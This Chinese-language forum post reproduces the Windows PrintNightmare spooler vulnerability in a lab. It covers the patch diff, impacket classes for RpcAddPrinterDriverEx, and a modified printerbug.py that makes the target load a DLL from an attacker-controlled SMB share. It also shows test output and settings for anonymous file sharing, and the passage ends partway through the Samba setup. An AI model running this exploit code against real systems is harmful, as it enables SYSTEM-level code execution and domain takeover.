
# [原创] Windows PrintNightmare 漏洞复现分析

## 漏洞简介

Windows Print Spooler是打印后台处理服务，即管理所有本地和网络打印队列及控制所有打印工作。Windows Print Spooler 存在权限提升漏洞，经过身份认证的攻击者可利用此漏洞使 Spooler 服务加载恶意 DLL，从而获取权限提升。利用此漏洞需身份认证，攻击者可通过多种方式获得身份认证信息。在域环境中合适的条件下，未经身份验证的远程攻击者可利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。

## 目标函数定位

尽管微软将 PrintNightmare 分配给了 `CVE-2021-34527`，笔者仍然认为它是 `CVE-2021-1675` 带来的远程代码执行相关的利用。首先进行补丁对比，比较明显的是 `RpcAddPrinterDriverEx` 函数，在调用 `YAddPrinterDriverEx` 函数前会进行判断，如果满足一定条件就对 `dwFileCopyFlags` 进行 `&FFFF7FFF` 处理，这样操作是为了取消 `dwFileCopyFlags` 中指定的 `0x8000`。

![补丁前](upload/attach/202201/701197_JWC7FYW7Z56AZPF.png)

![补丁后](upload/attach/202201/701197_RXEA2Z5EPS72VMW.png)

查看文档可知，`0x00008000` 代表 `APD_INSTALL_WARNED_DRIVER`，添加打印机驱动程序，即使它在服务器的警告打印机驱动程序列表中。那么下一步就是构造请求使 spooler 程序调用 `RpcAddPrinterDriverEx` 函数。

首先看一下有没有历史 POC，这样稍作修改就可以使用了。很快就找到了 `printerbug.py`，它是基于 `impacket` 写的，并且调用了 `RpcOpenPrinter`。但是看了下，`impacket` 中并没有实现 `RpcAddPrinterDriverEx`，于是参照 `impacket.dcerpc.v5.rprn` 中的格式，为 `RpcAddPrinterDriverEx` 添加了类，如下所示：

```
# 3.1.4.4.8 RpcAddPrinterDriverEx (Opnum 89)
class RpcAddPrinterDriverEx(NDRCALL):
opnum = 89
structure = (
('pName', STRING_HANDLE),
('pDriverContainer', DRIVER_CONTAINER),
('dwFileCopyFlags', DWORD),
)
class RpcAddPrinterDriverExResponse(NDRCALL):
structure = (
('ErrorCode', ULONG),
)
def hRpcAddPrinterDriverEx(dce, pName, DriverContainer, flags, level=2):
request = RpcAddPrinterDriverEx()
request['pName'] = pName
request['pDriverContainer'] = DriverContainer
request['dwFileCopyFlags'] = flags
dce.request(request)
################################################################################
# OPNUMs and their corresponding structures
################################################################################
OPNUMS = {
0 : (RpcEnumPrinters, RpcEnumPrintersResponse),
1 : (RpcOpenPrinter, RpcOpenPrinterResponse),
10 : (RpcEnumPrinterDrivers, RpcEnumPrinterDriversResponse),
29 : (RpcClosePrinter, RpcClosePrinterResponse),
65 : (RpcRemoteFindFirstPrinterChangeNotificationEx, RpcRemoteFindFirstPrinterChangeNotificationExResponse),
69 : (RpcOpenPrinterEx, RpcOpenPrinterExResponse),
89 : (RpcAddPrinterDriverEx, RpcAddPrinterDriverExResponse),
}
```

`RpcAddPrinterDriverEx` 函数的第二个参数类型 `DRIVER_CONTAINER` 有些复杂，但参考其他结构的格式很快就能为它写出定义代码：

```
##################################### MY ADD ######################################
# 2.2.1.5.1 DRIVER_INFO_1
class DRIVER_INFO_1(NDRSTRUCT):
structure = (
('notUsed',ULONGLONG),
)
class PDRIVER_INFO_1(NDRPOINTER):
referent = (
('Data', DRIVER_INFO_1),
)
# 2.2.1.5.2 DRIVER_INFO_2
class DRIVER_INFO_2(NDRSTRUCT):
structure = (
('cVersion',DWORD),
('pName',LPWSTR),
('pEnvironment',LPWSTR),
('pDriverPath',LPWSTR),
('pDataFile',LPWSTR),
('pConfigFile',LPWSTR),
)
class PDRIVER_INFO_2(NDRPOINTER):
referent = (
('Data', DRIVER_INFO_2),
)
# 2.2.1.5.3 RPC_DRIVER_INFO_3
class RPC_DRIVER_INFO_3(NDRSTRUCT):
structure = (
('cVersion',DWORD),
('pName',LPWSTR),
('pEnvironment',LPWSTR),
('pDriverPath',LPWSTR),
('pDataFile',LPWSTR),
('pConfigFile',LPWSTR),
('pHelpFile',LPWSTR),
('pMonitorName',LPWSTR),
('pDefaultDataType',LPWSTR),
('cchDependentFiles',DWORD),
('pDependentFiles',LPWSTR),
)
class PRPC_DRIVER_INFO_3(NDRPOINTER):
referent = (
('Data', RPC_DRIVER_INFO_3),
)
# 2.2.1.5.4 RPC_DRIVER_INFO_4
class RPC_DRIVER_INFO_4(NDRSTRUCT):
structure = (
('cVersion',DWORD),
('pName',LPWSTR),
('pEnvironment',LPWSTR),
('pDriverPath',LPWSTR),
('pDataFile',LPWSTR),
('pConfigFile',LPWSTR),
('pHelpFile',LPWSTR),
('pMonitorName',LPWSTR),
('pDefaultDataType',LPWSTR),
('cchDependentFiles',DWORD),
('pDependentFiles',LPWSTR),
('cchPreviousNames',DWORD),
('pszzPreviousNames',LPWSTR),
)
class PRPC_DRIVER_INFO_4(NDRPOINTER):
referent = (
('Data', RPC_DRIVER_INFO_4),
)
# 2.2.1.5.5 RPC_DRIVER_INFO_6
class FILETIME(NDRSTRUCT):
structure = (
('dwLowDateTime',DWORD),
('dwHighDateTime',DWORD),
)
class RPC_DRIVER_INFO_6(NDRSTRUCT):
structure = (
('cVersion',DWORD),
('pName',LPWSTR),
('pEnvironment',LPWSTR),
('pDriverPath',LPWSTR),
('pDataFile',LPWSTR),
('pConfigFile',LPWSTR),
('pHelpFile',LPWSTR),
('pMonitorName',LPWSTR),
('pDefaultDataType',LPWSTR),
('cchDependentFiles',DWORD),
('pDependentFiles',LPWSTR),
('cchPreviousNames',DWORD),
('pszzPreviousNames',LPWSTR),
('ftDriverDate',FILETIME),
('dwlDriverVersion',ULONGLONG),
('pMfgName',LPWSTR),
('pOEMUrl',LPWSTR),
('pHardwareID',LPWSTR),
('pProvider',LPWSTR),
)
class PRPC_DRIVER_INFO_6(NDRPOINTER):
referent = (
('Data', RPC_DRIVER_INFO_6),
)
# 2.2.1.5.6 RPC_DRIVER_INFO_8
class RPC_DRIVER_INFO_8(NDRSTRUCT):
structure = (
('cVersion',DWORD),
('pName',LPWSTR),
('pEnvironment',LPWSTR),
('pDriverPath',LPWSTR),
('pDataFile',LPWSTR),
('pConfigFile',LPWSTR),
('pHelpFile',LPWSTR),
('pMonitorName',LPWSTR),
('pDefaultDataType',LPWSTR),
('cchDependentFiles',DWORD),
('pDependentFiles',LPWSTR),
('cchPreviousNames',DWORD),
('pszzPreviousNames',LPWSTR),
('ftDriverDate',FILETIME),
('dwlDriverVersion',ULONGLONG),
('pMfgName',LPWSTR),
('pOEMUrl',LPWSTR),
('pHardwareID',LPWSTR),
('pProvider',LPWSTR),
('pPrintProcessor',LPWSTR),
('pVendorSetup',LPWSTR),
('cchColorProfiles',DWORD),
('pszzColorProfiles',LPWSTR),
('pInfPath',LPWSTR),
('dwPrinterDriverAttributes',DWORD),
('cchCoreDependencies',DWORD),
('ftMinInboxDriverVerDate',FILETIME),
('dwlMinInboxDriverVerVersion',ULONGLONG),
)
class PRPC_DRIVER_INFO_8(NDRPOINTER):
referent = (
('Data', RPC_DRIVER_INFO_8),
)
# 2.2.1.2.3 DRIVER_CONTAINER
class Driver_Info_UNION(NDRUNION):
commonHdr = (
('tag', ULONG),
)
union = {
1 : ('pNotUsed', PDRIVER_INFO_1),
2 : ('Level2', PDRIVER_INFO_2),
3 : ('Level3', PRPC_DRIVER_INFO_3),
4 : ('Level4', PRPC_DRIVER_INFO_4),
5 : ('Level6', PRPC_DRIVER_INFO_6),
6 : ('Level8', PRPC_DRIVER_INFO_8),
}
class DRIVER_CONTAINER(NDRSTRUCT):
structure = (
('Level',DWORD),
('DriverInfo',Driver_Info_UNION),
)
```

接下来修改 `printerbug.py`，主要修改了 `PrinterBug` 类中的 `lookup` 函数（这里有一个坑，`LPWSTR` 这些字符串要以 `\x00` 结尾，不然会报 `rpc_x_bad_stub_data` 错误，之前就卡在这里了），如下：

```
#def lookup(self, rpctransport, host):
level = 2
Driver_Info_Union = rprn.Driver_Info_UNION()
Driver_Info_Union['tag'] = level
DRIVER_INFO = Driver_Info_Union["Level"+str(level)]
DRIVER_INFO['cVersion'] = 3
DRIVER_INFO['pName'] = "Test printer\x00"
DRIVER_INFO['pEnvironment'] = "Windows x64\x00"
DRIVER_INFO['pDriverPath'] = pDriverPath
DRIVER_INFO['pDataFile'] = "\\\\{}\\smb\\asd.dll\x00".format(self.__attackerhost)
DRIVER_INFO['pConfigFile'] = "C:\\Windows\\System32\\winhttp.dll\x00"
DriverContainer = rprn.DRIVER_CONTAINER()
DriverContainer['Level'] = level
DriverContainer['DriverInfo'] = Driver_Info_Union
#resp = rprn.hRpcEnumPrinters(dce, rprn.PRINTER_ENUM_NAME)
print("[*] Attempting to call RpcAddPrinterDriverEx")
pName = NULL
flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
resp = rprn.hRpcAddPrinterDriverEx(dce, pName, DriverContainer, flags)
```

在测试之前还需要在共享的机器上配置允许匿名共享，不然会报错，如下：

```
┌──(strawberry㉿kalilili)-[~]
└─$ python testprinter.py strawberry@192.168.140.222 192.168.140.144
[*] Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation
Password:
[*] Attempting to trigger authentication via rprn RPC at 192.168.140.222
[*] Bind OK
[*] Attempting to call RpcAddPrinterDriverEx ......
[-] Lookup Error: RPRN SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
```

在 Windows 机器可以做如下配置：

```
新建文件夹 Share
右键属性 - 共享 - 网络和共享中心 - 设置 关闭密码保护共享
右键属性 - 共享 - 高级共享 - 选中 共享此文件夹
右键属性 - 共享 - 高级共享 - 权限 - 授予 Everyone 用户完全控制权限
右键属性 - 安全 - 添加 Everyone 用户并授予完全控制权限
gpedit.msc
计算机配置 - Windows 设置 - 安全设置 - 本地策略
用户权限分配
拒绝从网络访问这台计算机 (从列表中删除 Guest)
安全选项
网络访问: 本地账户的共享和安全模型 (选择 仅来宾)
网络访问: 将 Everyone 权限应用于匿名用户 (设置 已启用)
网络访问: 可匿名访问的共享 (新增 Share)
```

如果攻击机是 Linux，可以搭建 SMB 服务，然后修改 `/etc/samba/smb.conf` & `sudo service smbd start`：
